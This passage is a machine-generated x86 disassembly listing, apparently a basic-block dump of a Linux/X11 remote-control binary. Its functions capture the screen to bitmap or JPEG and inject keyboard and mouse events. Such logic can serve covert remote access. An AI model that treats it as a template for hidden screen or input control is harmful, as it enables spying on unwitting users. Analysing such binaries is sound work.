0x804ffef:	mov	dword ptr [esp], 1
0x804fff6:	call	0x804bfb0
None
|
|
|
v
0x8050141:	mov	eax, dword ptr [0x805b9fc]
0x8050146:	mov	dword ptr [esp], eax
0x8050149:	call	0x804bfb0
None
|
|
|
v
0x804ff13:	test	eax, eax
0x804ff15:	js	0x804ff4e
None
|
|
|
v
0x805015b:	mov	eax, dword ptr [0x805ba10]
0x8050160:	mov	dword ptr [esp], eax
0x8050163:	call	0x804bfb0
None
|
|
|
v
0x80500d6:	test	eax, eax
0x80500d8:	jns	0x8050105
None
|
|
|
v
0x8050298:	mov	eax, dword ptr [0x805b9f8]
0x805029d:	test	eax, eax
0x805029f:	jne	0x80501b6
None
|
|
|
v
0x805035c:	mov	eax, dword ptr [ebp - 0x818]
0x8050362:	cmp	eax, dword ptr [ebp - 0x81c]
0x8050368:	je	0x8050378
None
|
|
|
v
0x804febe:	mov	edx, eax
0x804fec0:	or	dh, 8
0x804fec3:	mov	eax, dword ptr [0x805ba00]
0x804fec8:	mov	dword ptr [esp + 8], edx
0x804fecc:	mov	dword ptr [esp + 4], 4
0x804fed4:	mov	dword ptr [esp], eax
0x804fed7:	call	0x804bdf0
None
|
|
|
v
0x80501b6:	mov	dword ptr [esp + 8], 0x800
0x80501be:	lea	eax, dword ptr [ebp - 0x80c]
0x80501c4:	mov	dword ptr [esp + 4], eax
0x80501c8:	mov	eax, dword ptr [ebp - 0x81c]
0x80501ce:	mov	dword ptr [esp], eax
0x80501d1:	call	0x804bba0
None
|
|
|
v
0x804fe4e:	mov	dword ptr [esp], 0x805b9fc
0x804fe55:	call	0x804be80
None
|
|
|
v
0x804fe04:	mov	dword ptr [ebp - 0x824], 0x8056182
0x804fe0e:	mov	eax, dword ptr [ebp - 0x824]
0x804fe14:	mov	dword ptr [esp], eax
0x804fe17:	call	0x804f12a
None
|
|
|
v
0x804ff74:	jmp	0x8050379
None
|
|
|
v
0x8050121:	mov	dword ptr [esp + 4], 0xf
0x8050129:	mov	dword ptr [esp], 0
0x8050130:	call	0x804bd90
None
|
|
|
v
0x804fedc:	test	eax, eax
0x804fede:	js	0x804ff4e
None
|
|
|
v
0x804fe1c:	xor	eax, 1
0x804fe1f:	test	al, al
0x804fe21:	je	0x804fe4e
None
|
|
|
v
0x80500da:	mov	eax, dword ptr [ebp - 0x82c]
0x80500e0:	mov	dword ptr [esp + 0xc], 0
0x80500e8:	mov	dword ptr [esp + 8], 0
0x80500f0:	mov	dword ptr [esp + 4], 0x1f
0x80500f8:	mov	dword ptr [esp], eax
0x80500fb:	call	0x804e62a
None
|
|
|
v
0x8050007:	mov	eax, dword ptr [0x805b9fc]
0x805000c:	mov	dword ptr [esp], eax
0x805000f:	call	0x804bbb0
None
|
|
|
v
0x8050019:	mov	eax, dword ptr [0x805ba08]
0x805001e:	mov	dword ptr [esp], eax
0x8050021:	call	0x804bbb0
None
|
|
|
v
0x804fe23:	mov	eax, dword ptr [ebp - 0x82c]
0x804fe29:	mov	dword ptr [esp + 0xc], 0
0x804fe31:	mov	dword ptr [esp + 8], 0
0x804fe39:	mov	dword ptr [esp + 4], 0x1f
0x804fe41:	mov	dword ptr [esp], eax
0x804fe44:	call	0x804e62a
None
|
|
|
v
0x804fe5a:	test	eax, eax
0x804fe5c:	jne	0x804fe7e
None
|
|
|
v
0x80500a9:	mov	eax, dword ptr [0x805ba10]
0x80500ae:	mov	dword ptr [esp], eax
0x80500b1:	call	0x804bfb0
None
|
|
|
v
0x804fee0:	mov	eax, dword ptr [0x805ba04]
0x804fee5:	mov	dword ptr [esp + 4], 3
0x804feed:	mov	dword ptr [esp], eax
0x804fef0:	call	0x804bdf0
None
|
|
|
v
0x804ff2c:	mov	edx, eax
0x804ff2e:	or	dh, 8
0x804ff31:	mov	eax, dword ptr [0x805ba0c]
0x804ff36:	mov	dword ptr [esp + 8], edx
0x804ff3a:	mov	dword ptr [esp + 4], 4
0x804ff42:	mov	dword ptr [esp], eax
0x804ff45:	call	0x804bdf0
None
|
|
|
v
0x80502fb:	cmp	eax, 0xff
0x80502fe:	je	0x805030c
None
|
|
|
v
0x804fef5:	mov	edx, eax
0x804fef7:	or	dh, 8
0x804fefa:	mov	eax, dword ptr [0x805ba04]
0x804feff:	mov	dword ptr [esp + 8], edx
0x804ff03:	mov	dword ptr [esp + 4], 4
0x804ff0b:	mov	dword ptr [esp], eax
0x804ff0e:	call	0x804bdf0
None
|
|
|
v
0x804ff17:	mov	eax, dword ptr [0x805ba0c]
0x804ff1c:	mov	dword ptr [esp + 4], 3
0x804ff24:	mov	dword ptr [esp], eax
0x804ff27:	call	0x804bdf0
None
|
|
|
v
0x804fe0e:	mov	eax, dword ptr [ebp - 0x824]
0x804fe14:	mov	dword ptr [esp], eax
0x804fe17:	call	0x804f12a
None
|
|
|
v
0x8050294:	test	eax, eax
0x8050296:	js	0x80502a5
None
|
|
|
v
0x804fe5e:	mov	dword ptr [esp], 0x805ba04
0x804fe65:	call	0x804be80
None
|
|
|
v
0x804ffd6:	cmp	dword ptr [ebp - 0x814], 0
0x804ffdd:	jne	0x8050141
None
|
|
|
v
0x8050268:	mov	dword ptr [esp], 0x96
0x805026f:	call	0x804f548
None
|
|
|
v
0x80502a5:	mov	eax, dword ptr [ebp - 0x82c]
0x80502ab:	mov	dword ptr [esp + 0xc], 0
0x80502b3:	mov	dword ptr [esp + 8], 0
0x80502bb:	mov	dword ptr [esp + 4], 0x1d
0x80502c3:	mov	dword ptr [esp], eax
0x80502c6:	call	0x804e62a
None
|
|
|
v
0x8050340:	mov	eax, dword ptr [ebp - 0x820]
0x8050346:	mov	dword ptr [esp], eax
0x8050349:	call	0x804bfb0
None
|
|
|
v
0x8050038:	cmp	eax, 0xff
0x805003b:	jne	0x8050068
None
|
|
|
v
0x8050100:	jmp	0x8050379
None
|
|
|
v
0x805032a:	mov	dword ptr [esp + 4], 0xf
0x8050332:	mov	eax, dword ptr [ebp - 0x814]
0x8050338:	mov	dword ptr [esp], eax
0x805033b:	call	0x804bd90
None
|
|
|
v
0x80500b6:	mov	dword ptr [esp + 8], 0
0x80500be:	mov	eax, dword ptr [ebp - 0x824]
0x80500c4:	mov	dword ptr [esp + 4], eax
0x80500c8:	mov	eax, dword ptr [ebp - 0x824]
0x80500ce:	mov	dword ptr [esp], eax
0x80500d1:	call	0x804bc40
None
|
|
|
v
0x80502d4:	mov	eax, dword ptr [0x805b9f8]
0x80502d9:	test	eax, eax
0x80502db:	jne	0x805030c
None
|
|
|
v
0x804ffab:	mov	eax, dword ptr [ebp - 0x82c]
0x804ffb1:	mov	dword ptr [esp + 0xc], 0
0x804ffb9:	mov	dword ptr [esp + 8], 0
0x804ffc1:	mov	dword ptr [esp + 4], 0x1f
0x804ffc9:	mov	dword ptr [esp], eax
0x804ffcc:	call	0x804e62a
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:WriteCommand
TOTAL BLOCKS :4
0x80503a9:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80503ab:	mov	eax, ecx
0x80503ad:	not	eax
0x80503af:	lea	edx, dword ptr [eax - 1]
0x80503b2:	mov	eax, dword ptr [0x805ba00]
0x80503b7:	mov	dword ptr [esp + 8], edx
0x80503bb:	mov	edx, dword ptr [ebp + 8]
0x80503be:	mov	dword ptr [esp + 4], edx
0x80503c2:	mov	dword ptr [esp], eax
0x80503c5:	call	0x804bdd0
None
|
|
|
v
0x805038c:	push	ebp
0x805038d:	mov	ebp, esp
0x805038f:	push	edi
0x8050390:	sub	esp, 0x24
0x8050393:	mov	eax, dword ptr [ebp + 8]
0x8050396:	mov	dword ptr [ebp - 0xc], 0xffffffff
0x805039d:	mov	edx, eax
0x805039f:	mov	eax, 0
0x80503a4:	mov	ecx, dword ptr [ebp - 0xc]
0x80503a7:	mov	edi, edx
0x80503a9:	repne scasb	al, byte ptr es:[edi]
None
|
|
|
v
0x80503ca:	add	esp, 0x24
0x80503cd:	pop	edi
0x80503ce:	pop	ebp
0x80503cf:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:SaveXImageToBitmap
TOTAL BLOCKS :28
0x805046b:	mov	ecx, dword ptr [esp + 0x14]
0x805046f:	imul	ecx, dword ptr [esp + 0x10]
0x8050474:	mov	eax, dword ptr [esp + 0x94]
0x805047b:	mov	edi, ecx
0x805047d:	add	edi, 0x36
0x8050480:	mov	dword ptr [esp + 0x24], ecx
0x8050484:	sub	esp, 0xc
0x8050487:	mov	dword ptr [eax], edi
0x8050489:	push	edi
0x805048a:	call	0x804bd40
None
|
|
|
v
0x8050460:	inc	dword ptr [esp + 0x14]
0x8050464:	test	byte ptr [esp + 0x14], 3
0x8050469:	jne	0x8050460
None
|
|
|
v
0x80503d0:	push	ebp
0x80503d1:	push	edi
0x80503d2:	push	esi
0x80503d3:	push	ebx
0x80503d4:	mov	ebx, 0xe
0x80503d9:	sub	esp, 0x7c
0x80503dc:	mov	ecx, ebx
0x80503de:	mov	eax, dword ptr [esp + 0x94]
0x80503e5:	lea	edx, dword ptr [esp + 0x62]
0x80503e9:	mov	edi, edx
0x80503eb:	mov	esi, dword ptr [esp + 0x90]
0x80503f2:	lea	edx, dword ptr [esp + 0x3a]
0x80503f6:	mov	dword ptr [eax], 0
0x80503fc:	xor	eax, eax
0x80503fe:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x80505a8:	lea	esi, dword ptr [esp + 0x62]
0x80505ac:	mov	ecx, 0xe
0x80505b1:	mov	edi, eax
0x80505b3:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x805054f:	mov	eax, dword ptr [esp + 0x10]
0x8050553:	add	ecx, edx
0x8050555:	imul	ecx, dword ptr [esp + 0x10]
0x805055a:	mov	word ptr [esp + 0x48], di
0x805055f:	imul	eax, ebx
0x8050562:	shl	ebx, 2
0x8050565:	imul	ebx, dword ptr [esp + 0x10]
0x805056a:	mov	dword ptr [esp + 0x4e], ecx
0x805056e:	lea	eax, dword ptr [eax*4 + 0x36]
0x8050575:	mov	dword ptr [esp + 0x64], eax
0x8050579:	mov	eax, dword ptr [esp + 0x94]
0x8050580:	sub	esp, 0xc
0x8050583:	add	ebx, 0x36
0x8050586:	mov	dword ptr [eax], ebx
0x8050588:	push	ebx
0x8050589:	call	0x804bd40
None
|
|
|
v
0x8050417:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x805048f:	add	esp, 0x10
0x8050492:	test	eax, eax
0x8050494:	je	0x80505bd
None
|
|
|
v
0x80505a6:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x8050445:	lea	edi, dword ptr [ebx*4]
0x805044c:	lea	edx, dword ptr [ebx + ebx*2]
0x805044f:	mov	word ptr [esp + 0x48], 4
0x8050456:	mov	dword ptr [esp + 0x28], edi
0x805045a:	mov	dword ptr [esp + 0x14], edx
0x805045e:	jmp	0x8050464
None
|
|
|
v
0x80505bb:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8050595:	mov	ecx, dword ptr [esi]
0x8050597:	lea	edx, dword ptr [eax + 0x36]
0x805059a:	mov	edi, edx
0x805059c:	shl	ecx, 2
0x805059f:	imul	ecx, dword ptr [esi + 4]
0x80505a3:	mov	esi, dword ptr [esi + 0x10]
0x80505a6:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x80505bd:	add	esp, 0x7c
0x80505c0:	pop	ebx
0x80505c1:	pop	esi
0x80505c2:	pop	edi
0x80505c3:	pop	ebp
0x80505c4:	ret	
None
|
|
|
v
0x80504b5:	mov	esi, dword ptr [esp + 0xc]
0x80504b9:	inc	dword ptr [esp + 0x20]
0x80504bd:	add	dword ptr [esp + 0xc], 4
0x80504c2:	and	esi, 0xfffffffc
0x80504c5:	add	esi, dword ptr [esp + 0x2c]
0x80504c9:	movzx	ebp, byte ptr [esi + 2]
0x80504cd:	mov	eax, ebp
0x80504cf:	mov	byte ptr [edx + 0x35], al
0x80504d2:	mov	ebp, dword ptr [esi]
0x80504d4:	mov	eax, ebp
0x80504d6:	movzx	ebp, ah
0x80504d9:	mov	eax, ebp
0x80504db:	mov	byte ptr [edx + 0x34], al
0x80504de:	mov	esi, dword ptr [esi]
0x80504e0:	mov	eax, esi
0x80504e2:	mov	byte ptr [edx + 0x33], al
0x80504e5:	add	edx, 3
0x80504e8:	cmp	dword ptr [esp + 0x20], ebx
0x80504ec:	jl	0x80504b5
None
|
|
|
v
0x8050400:	mov	edi, edx
0x8050402:	mov	word ptr [esp + 0x62], 0x4d42
0x8050409:	mov	dword ptr [esp + 0x6c], 0x36
0x8050411:	mov	ebx, ecx
0x8050413:	mov	cl, 0xa
0x8050415:	mov	eax, ebx
0x8050417:	rep stosd	dword ptr es:[edi], eax
None
|
|
|
v
0x80503fe:	rep stosb	byte ptr es:[edi], al
None
|
|
|
v
0x805050c:	mov	esi, dword ptr [esp + 0x18]
0x8050510:	lea	edx, dword ptr [eax + ecx]
0x8050513:	mov	dword ptr [esp + 0x20], 0
0x805051b:	mov	dword ptr [esp + 8], eax
0x805051f:	mov	dword ptr [esp + 0xc], esi
0x8050523:	jmp	0x80504e5
None
|
|
|
v
0x80505b5:	lea	esi, dword ptr [esp + 0x3a]
0x80505b9:	mov	cl, 0xa
0x80505bb:	rep movsd	dword ptr es:[edi], dword ptr [esi]
None
|
|
|
v
0x8050502:	mov	esi, dword ptr [esp + 0x10]
0x8050506:	cmp	dword ptr [esp + 0x1c], esi
0x805050a:	jge	0x8050525
None
|
|
|
v
0x805053a:	lea	ecx, dword ptr [ebx + ebx*2]
0x805053d:	mov	ebp, 4
0x8050542:	mov	eax, ecx
0x8050544:	cdq	
0x8050545:	idiv	ebp
0x8050547:	test	edx, edx
0x8050549:	je	0x805054f
None
|
|
|
v
0x80504e5:	add	edx, 3
0x80504e8:	cmp	dword ptr [esp + 0x20], ebx
0x80504ec:	jl	0x80504b5
None
|
|
|
v
0x8050464:	test	byte ptr [esp + 0x14], 3
0x8050469:	jne	0x8050460
None
|
|
|
v
0x805049a:	mov	esi, dword ptr [esi + 0x10]
0x805049d:	xor	ecx, ecx
0x805049f:	mov	dword ptr [esp + 0x1c], 0
0x80504a7:	mov	dword ptr [esp + 0x18], 0
0x80504af:	mov	dword ptr [esp + 0x2c], esi
0x80504b3:	jmp	0x8050502
None
|
|
|
v
0x80504ee:	mov	edx, dword ptr [esp + 0x28]
0x80504f2:	mov	eax, dword ptr [esp + 8]
0x80504f6:	add	dword ptr [esp + 0x18], edx
0x80504fa:	inc	dword ptr [esp + 0x1c]
0x80504fe:	add	ecx, dword ptr [esp + 0x14]
0x8050502:	mov	esi, dword ptr [esp + 0x10]
0x8050506:	cmp	dword ptr [esp + 0x1c], esi
0x805050a:	jge	0x8050525
None
|
|
|
v
0x805058e:	add	esp, 0x10
0x8050591:	test	eax, eax
0x8050593:	je	0x80505bd
None
|
|
|
v
0x805054b:	sub	ebp, edx
0x805054d:	mov	edx, ebp
0x805054f:	mov	eax, dword ptr [esp + 0x10]
0x8050553:	add	ecx, edx
0x8050555:	imul	ecx, dword ptr [esp + 0x10]
0x805055a:	mov	word ptr [esp + 0x48], di
0x805055f:	imul	eax, ebx
0x8050562:	shl	ebx, 2
0x8050565:	imul	ebx, dword ptr [esp + 0x10]
0x805056a:	mov	dword ptr [esp + 0x4e], ecx
0x805056e:	lea	eax, dword ptr [eax*4 + 0x36]
0x8050575:	mov	dword ptr [esp + 0x64], eax
0x8050579:	mov	eax, dword ptr [esp + 0x94]
0x8050580:	sub	esp, 0xc
0x8050583:	add	ebx, 0x36
0x8050586:	mov	dword ptr [eax], ebx
0x8050588:	push	ebx
0x8050589:	call	0x804bd40
None
|
|
|
v
0x8050419:	mov	dword ptr [esp + 0x3a], 0x28
0x8050421:	mov	word ptr [esp + 0x46], 1
0x8050428:	mov	edi, dword ptr [esi + 0x2c]
0x805042b:	mov	ecx, dword ptr [esi + 4]
0x805042e:	mov	ebx, dword ptr [esi]
0x8050430:	cmp	edi, 0x20
0x8050433:	mov	dword ptr [esp + 0x10], ecx
0x8050437:	mov	dword ptr [esp + 0x3e], ebx
0x805043b:	mov	dword ptr [esp + 0x42], ecx
0x805043f:	jne	0x805053a
None
|
|
|
v
0x80505b3:	rep movsb	byte ptr es:[edi], byte ptr [esi]
None
|
|
|
v
0x8050525:	mov	dword ptr [esp + 0x64], edi
0x8050529:	mov	edi, dword ptr [esp + 0x24]
0x805052d:	mov	word ptr [esp + 0x48], 0x18
0x8050534:	mov	dword ptr [esp + 0x4e], edi
0x8050538:	jmp	0x80505a8
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CaptureScreen
TOTAL BLOCKS :12
0x80505e7:	mov	eax, dword ptr [esp + 0xc]
0x80505eb:	sub	esp, 0xc
0x80505ee:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80505f5:	add	edx, dword ptr [eax + 0x8c]
0x80505fb:	mov	ebx, dword ptr [edx + 8]
0x80505fe:	lea	edx, dword ptr [esp + 0x10]
0x8050602:	push	edx
0x8050603:	push	edx
0x8050604:	push	esi
0x8050605:	push	edi
0x8050606:	lea	ecx, dword ptr [esp + 0x24]
0x805060a:	push	ecx
0x805060b:	push	ecx
0x805060c:	push	edx
0x805060d:	push	ebx
0x805060e:	push	eax
0x805060f:	call	dword ptr [0x805be74]
None
|
|
|
v
0x8050663:	add	esp, 0x1c
0x8050666:	mov	eax, ebp
0x8050668:	pop	ebx
0x8050669:	pop	esi
0x805066a:	pop	edi
0x805066b:	pop	ebp
0x805066c:	ret	
None
|
|
|
v
0x805063b:	cmp	dword ptr [edi], 0
0x805063e:	jne	0x8050645
None
|
|
|
v
0x8050660:	add	esp, 0x10
0x8050663:	add	esp, 0x1c
0x8050666:	mov	eax, ebp
0x8050668:	pop	ebx
0x8050669:	pop	esi
0x805066a:	pop	edi
0x805066b:	pop	ebp
0x805066c:	ret	
None
|
|
|
v
0x8050615:	add	esp, 0x30
0x8050618:	push	2
0x805061a:	push	0xffffff
0x805061f:	push	dword ptr [esi]
0x8050621:	push	dword ptr [edi]
0x8050623:	push	0
0x8050625:	push	0
0x8050627:	push	ebx
0x8050628:	push	dword ptr [esp + 0x28]
0x805062c:	call	dword ptr [0x805be64]
None
|
|
|
v
0x80505e0:	add	esp, 0x10
0x80505e3:	test	al, al
0x80505e5:	je	0x8050663
None
|
|
|
v
0x8050640:	cmp	dword ptr [esi], 0
0x8050643:	je	0x8050656
None
|
|
|
v
0x8050632:	add	esp, 0x20
0x8050635:	test	eax, eax
0x8050637:	mov	ebx, eax
0x8050639:	je	0x8050663
None
|
|
|
v
0x80505c5:	push	ebp
0x80505c6:	xor	ebp, ebp
0x80505c8:	push	edi
0x80505c9:	push	esi
0x80505ca:	push	ebx
0x80505cb:	sub	esp, 0x28
0x80505ce:	lea	eax, dword ptr [esp + 0x18]
0x80505d2:	mov	edi, dword ptr [esp + 0x40]
0x80505d6:	mov	esi, dword ptr [esp + 0x44]
0x80505da:	push	eax
0x80505db:	call	0x80558b7
None
|
|
|
v
0x8050656:	sub	esp, 0xc
0x8050659:	push	ebx
0x805065a:	call	dword ptr [0x805be60]
None
|
|
|
v
0x8050645:	push	eax
0x8050646:	push	eax
0x8050647:	push	dword ptr [esp + 0x38]
0x805064b:	push	ebx
0x805064c:	call	0x80503d0
None
|
|
|
v
0x8050651:	add	esp, 0x10
0x8050654:	mov	ebp, eax
0x8050656:	sub	esp, 0xc
0x8050659:	push	ebx
0x805065a:	call	dword ptr [0x805be60]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:CaptureScreenToJPEG
TOTAL BLOCKS :6
0x80506ae:	push	ecx
0x80506af:	and	edi, 0xff
0x80506b5:	push	ecx
0x80506b6:	and	esi, 0xff
0x80506bc:	push	edi
0x80506bd:	push	esi
0x80506be:	push	dword ptr [esp + 0x24]
0x80506c2:	push	dword ptr [esp + 0x2c]
0x80506c6:	push	ebx
0x80506c7:	push	edx
0x80506c8:	call	0x804d6c0
None
|
|
|
v
0x80506de:	add	esp, 0x10
0x80506e1:	mov	eax, dword ptr [esp + 0xc]
0x80506e5:	add	esp, 0x20
0x80506e8:	pop	ebx
0x80506e9:	pop	esi
0x80506ea:	pop	edi
0x80506eb:	ret	
None
|
|
|
v
0x80506e5:	add	esp, 0x20
0x80506e8:	pop	ebx
0x80506e9:	pop	esi
0x80506ea:	pop	edi
0x80506eb:	ret	
None
|
|
|
v
0x805069f:	mov	edx, eax
0x80506a1:	mov	dword ptr [esp + 0x2c], eax
0x80506a5:	add	esp, 0x10
0x80506a8:	xor	eax, eax
0x80506aa:	test	edx, edx
0x80506ac:	je	0x80506e5
None
|
|
|
v
0x80506cd:	add	esp, 0x14
0x80506d0:	lea	edx, dword ptr [esp + 0x28]
0x80506d4:	push	edx
0x80506d5:	mov	dword ptr [esp + 0x1c], eax
0x80506d9:	call	0x804f57c
None
|
|
|
v
0x805066d:	push	edi
0x805066e:	push	esi
0x805066f:	push	ebx
0x8050670:	sub	esp, 0x24
0x8050673:	mov	ebx, dword ptr [esp + 0x34]
0x8050677:	lea	eax, dword ptr [esp + 0x18]
0x805067b:	mov	esi, dword ptr [esp + 0x38]
0x805067f:	mov	edi, dword ptr [esp + 0x3c]
0x8050683:	mov	dword ptr [esp + 0x18], 0
0x805068b:	mov	dword ptr [esp + 0x1c], 0
0x8050693:	push	eax
0x8050694:	lea	eax, dword ptr [esp + 0x20]
0x8050698:	push	eax
0x8050699:	push	ebx
0x805069a:	call	0x80505c5
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpScreenCapture
TOTAL BLOCKS :10
0x80507a6:	add	esp, 0x10
0x80507a9:	add	esp, 0x14
0x80507ac:	pop	ebx
0x80507ad:	pop	esi
0x80507ae:	ret	
None
|
|
|
v
0x8050713:	add	esp, 0x10
0x8050716:	test	eax, eax
0x8050718:	mov	esi, eax
0x805071a:	je	0x8050723
None
|
|
|
v
0x8050723:	push	0
0x8050725:	push	0
0x8050727:	push	0x33
0x8050729:	push	ebx
0x805072a:	call	0x804e62a
None
|
|
|
v
0x805072f:	jmp	0x80507a6
None
|
|
|
v
0x80507a9:	add	esp, 0x14
0x80507ac:	pop	ebx
0x80507ad:	pop	esi
0x80507ae:	ret	
None
|
|
|
v
0x80506ec:	push	esi
0x80506ed:	push	ebx
0x80506ee:	sub	esp, 0x18
0x80506f1:	movzx	eax, byte ptr [esp + 0x2c]
0x80506f6:	mov	ebx, dword ptr [esp + 0x24]
0x80506fa:	mov	dword ptr [esp + 0x10], 0
0x8050702:	push	eax
0x8050703:	movzx	eax, byte ptr [esp + 0x2c]
0x8050708:	push	eax
0x8050709:	lea	eax, dword ptr [esp + 0x18]
0x805070d:	push	eax
0x805070e:	call	0x805066d
None
|
|
|
v
0x8050745:	mov	edx, dword ptr [esp + 0xc]
0x8050749:	mov	dword ptr [eax + 0x200c], ebx
0x805074f:	mov	dword ptr [eax + 0x2004], 2
0x8050759:	mov	byte ptr [eax + 0x2008], 0x31
0x8050760:	mov	ecx, edx
0x8050762:	sar	ecx, 0x1f
0x8050765:	mov	byte ptr [eax + 0x2009], 0x32
0x805076c:	mov	byte ptr [eax + 0x200a], 0x33
0x8050773:	mov	dword ptr [eax + 0x2000], esi
0x8050779:	mov	dword ptr [eax + 0x2010], edx
0x805077f:	mov	dword ptr [eax + 0x2014], ecx
0x8050785:	mov	dword ptr [eax + 0x2018], 0
0x805078f:	mov	dword ptr [eax + 0x201c], 0
0x8050799:	push	ebx
0x805079a:	push	ebx
0x805079b:	push	eax
0x805079c:	push	0x8053167
0x80507a1:	call	0x804f559
None
|
|
|
v
0x8050731:	sub	esp, 0xc
0x8050734:	push	0x2024
0x8050739:	call	0x804bd40
None
|
|
|
v
0x805071c:	cmp	dword ptr [esp + 0xc], 0
0x8050721:	jg	0x8050731
None
|
|
|
v
0x805073e:	add	esp, 0x10
0x8050741:	test	eax, eax
0x8050743:	je	0x80507a9
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpKeyDown
TOTAL BLOCKS :7
0x80507c7:	push	eax
0x80507c8:	lea	eax, dword ptr [esp + 0x50]
0x80507cc:	push	eax
0x80507cd:	lea	eax, dword ptr [esp + 0x50]
0x80507d1:	push	eax
0x80507d2:	push	dword ptr [esp + 0x50]
0x80507d6:	call	dword ptr [0x805be68]
None
|
|
|
v
0x80507bc:	add	esp, 0x10
0x80507bf:	test	al, al
0x80507c1:	je	0x805086f
None
|
|
|
v
0x805086c:	add	esp, 0x20
0x805086f:	add	esp, 0x5c
0x8050872:	ret	
None
|
|
|
v
0x80507af:	sub	esp, 0x68
0x80507b2:	lea	eax, dword ptr [esp + 0x50]
0x80507b6:	push	eax
0x80507b7:	call	0x80558b7
None
|
|
|
v
0x80507dc:	mov	eax, dword ptr [esp + 0x54]
0x80507e0:	mov	edx, dword ptr [esp + 0x58]
0x80507e4:	mov	dword ptr [esp + 0x24], eax
0x80507e8:	mov	dword ptr [esp + 0x28], edx
0x80507ec:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80507f3:	add	edx, dword ptr [eax + 0x8c]
0x80507f9:	mov	edx, dword ptr [edx + 8]
0x80507fc:	mov	dword ptr [esp + 0x34], 0
0x8050804:	mov	dword ptr [esp + 0x38], 1
0x805080c:	mov	dword ptr [esp + 0x3c], 1
0x8050814:	mov	dword ptr [esp + 0x2c], edx
0x8050818:	mov	dword ptr [esp + 0x40], 1
0x8050820:	mov	dword ptr [esp + 0x44], 1
0x8050828:	mov	dword ptr [esp + 0x50], 1
0x8050830:	pop	edx
0x8050831:	pop	ecx
0x8050832:	push	dword ptr [esp + 0x68]
0x8050836:	push	eax
0x8050837:	call	dword ptr [0x805be24]
None
|
|
|
v
0x805086f:	add	esp, 0x5c
0x8050872:	ret	
None
|
|
|
v
0x805083d:	mov	dword ptr [esp + 0x48], 0
0x8050845:	mov	dword ptr [esp + 0x18], 2
0x805084d:	movzx	eax, al
0x8050850:	mov	dword ptr [esp + 0x4c], eax
0x8050854:	pop	eax
0x8050855:	lea	eax, dword ptr [esp + 0x14]
0x8050859:	push	eax
0x805085a:	push	1
0x805085c:	push	1
0x805085e:	push	dword ptr [esp + 0x30]
0x8050862:	push	dword ptr [esp + 0x30]
0x8050866:	call	dword ptr [0x805be3c]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpKeyUp
TOTAL BLOCKS :7
0x80508a0:	mov	eax, dword ptr [esp + 0x54]
0x80508a4:	mov	edx, dword ptr [esp + 0x58]
0x80508a8:	mov	dword ptr [esp + 0x24], eax
0x80508ac:	mov	dword ptr [esp + 0x28], edx
0x80508b0:	imul	edx, dword ptr [eax + 0x84], 0x50
0x80508b7:	add	edx, dword ptr [eax + 0x8c]
0x80508bd:	mov	edx, dword ptr [edx + 8]
0x80508c0:	mov	dword ptr [esp + 0x34], 0
0x80508c8:	mov	dword ptr [esp + 0x38], 1
0x80508d0:	mov	dword ptr [esp + 0x3c], 1
0x80508d8:	mov	dword ptr [esp + 0x2c], edx
0x80508dc:	mov	dword ptr [esp + 0x40], 1
0x80508e4:	mov	dword ptr [esp + 0x44], 1
0x80508ec:	mov	dword ptr [esp + 0x50], 1
0x80508f4:	pop	edx
0x80508f5:	pop	ecx
0x80508f6:	push	dword ptr [esp + 0x68]
0x80508fa:	push	eax
0x80508fb:	call	dword ptr [0x805be24]
None
|
|
|
v
0x8050873:	sub	esp, 0x68
0x8050876:	lea	eax, dword ptr [esp + 0x50]
0x805087a:	push	eax
0x805087b:	call	0x80558b7
None
|
|
|
v
0x8050933:	add	esp, 0x5c
0x8050936:	ret	
None
|
|
|
v
0x8050901:	mov	dword ptr [esp + 0x48], 0
0x8050909:	mov	dword ptr [esp + 0x18], 2
0x8050911:	movzx	eax, al
0x8050914:	mov	dword ptr [esp + 0x4c], eax
0x8050918:	pop	eax
0x8050919:	lea	eax, dword ptr [esp + 0x14]
0x805091d:	push	eax
0x805091e:	push	2
0x8050920:	push	1
0x8050922:	push	dword ptr [esp + 0x30]
0x8050926:	push	dword ptr [esp + 0x30]
0x805092a:	call	dword ptr [0x805be3c]
None
|
|
|
v
0x8050880:	add	esp, 0x10
0x8050883:	test	al, al
0x8050885:	je	0x8050933
None
|
|
|
v
0x805088b:	push	eax
0x805088c:	lea	eax, dword ptr [esp + 0x50]
0x8050890:	push	eax
0x8050891:	lea	eax, dword ptr [esp + 0x50]
0x8050895:	push	eax
0x8050896:	push	dword ptr [esp + 0x50]
0x805089a:	call	dword ptr [0x805be68]
None
|
|
|
v
0x8050930:	add	esp, 0x20
0x8050933:	add	esp, 0x5c
0x8050936:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:cpMouseDown
TOTAL BLOCKS :18
0x8050990:	mov	dword ptr [esp + 0x40], 3
0x8050998:	mov	eax, dword ptr [esp + 0x6c]
0x805099c:	mov	dword ptr [esp + 0x44], 1
0x80509a4:	sub	esp, 0xc
0x80509a7:	lea	esi, dword ptr [esp + 0x48]
0x80509ab:	push	esi
0x80509ac:	lea	ebx, dword ptr [esp + 0x40]
0x80509b0:	push	ebx
0x80509b1:	lea	edx, dword ptr [esp + 0x40]
0x80509b5:	push	edx
0x80509b6:	lea	edx, dword ptr [esp + 0x50]
0x80509ba:	push	edx
0x80509bb:	lea	edx, dword ptr [esp + 0x50]
0x80509bf:	push	edx
0x80509c0:	lea	edx, dword ptr [esp + 0x3c]
0x80509c4:	push	edx
